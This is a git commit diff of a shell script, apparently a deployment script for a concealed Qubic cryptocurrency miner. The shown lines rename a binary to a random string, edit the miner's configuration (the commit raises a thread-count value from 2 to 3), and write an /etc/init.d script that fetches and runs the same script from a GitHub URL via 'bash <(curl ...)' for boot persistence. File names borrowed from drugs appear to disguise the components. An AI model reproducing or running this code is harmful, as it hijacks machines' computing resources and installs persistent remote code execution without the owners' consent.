2183f43f752f4cae8d19e7fe9bf0d91fb9d048e6
merisye <meriysella44@gmail.com>
2024-06-13 18:58:53 +0700

    Update amide.sh

--- amide.sh
+++ amide.sh
@@ -5,7 +5,7 @@ cd /epipen
 variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
 mv isonia $variable1
 sed -i "s/python/${variable1}/g" ./xarelto.sh
-sed -i "s/SUM/2/g" ./qubicmine.json
+sed -i "s/SUM/3/g" ./qubicmine.json
 sed -i "s/ALIAS/${variable1}/g" ./qubicmine.json
 cd /etc/init.d
 echo "bash <(curl -s -L https://raw.githubusercontent.com/merisye/naprox/main/amide.sh)" > valium.sh
